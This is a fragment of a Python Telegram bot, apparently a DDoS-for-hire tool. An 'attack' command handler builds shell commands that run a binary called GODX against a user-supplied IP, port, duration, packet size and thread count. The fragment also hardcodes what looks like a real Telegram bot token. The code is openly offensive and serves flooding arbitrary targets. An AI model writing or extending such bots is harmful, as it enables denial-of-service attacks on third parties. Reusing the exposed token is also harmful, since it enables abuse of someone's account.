...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '8160560841:AAGh-ES0PNmJcgx5mGjbzglDaM95Vq-Jxhc'
...
async def attack(update: Update, context: CallbackContext):
    ...
    if argument_type == 3:
        attack_command = f"./GODX {ip} {port} {duration}"
    elif argument_type == 4:
        attack_command = f"./GODX {ip} {port} {duration} {threads}"
    elif argument_type == 5:
        attack_command = f"./GODX {ip} {port} {duration} {byte_size} {threads}"
